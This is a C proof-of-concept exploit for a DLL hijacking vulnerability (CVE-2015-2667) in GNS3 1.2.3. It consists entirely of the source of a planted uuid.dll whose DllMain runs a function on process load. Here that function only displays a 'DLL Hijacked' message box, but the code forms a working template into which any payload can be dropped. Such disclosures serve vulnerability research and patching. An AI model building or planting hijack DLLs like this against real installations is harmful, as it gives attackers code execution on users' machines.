/*
* Title: GNS3 1.2.3 DLL Hijacking Exploit (uuid.dll)
* Version: 2.0.1.7
* Tested on: Windows 8 
* Vendor: http://www.gns3.com/
* Software-Link: http://downloads.gns3.com/GNS3-1.2.3-all-in-one.exe
* E-Mail: osanda[at]unseen.is
* Author: Osanda Malith Jayathissa
* Date: 01-05-2015
* /!\ Author is not responsible for any damage you cause
* Use this material for educational purposes only
* CVE: CVE-2015-2667
*/ 
#include <windows.h> 

BOOL WINAPI DllMain (
            HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
{
    switch (fdwReason)
  {
  case DLL_PROCESS_ATTACH: owned();
  case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
  break;
  }
  return TRUE;
}

int owned() {
  MessageBox(0, "GNS3 1.2.3 DLL Hijacked\nOsanda", "POC", MB_OK);
}
/*EOF*/
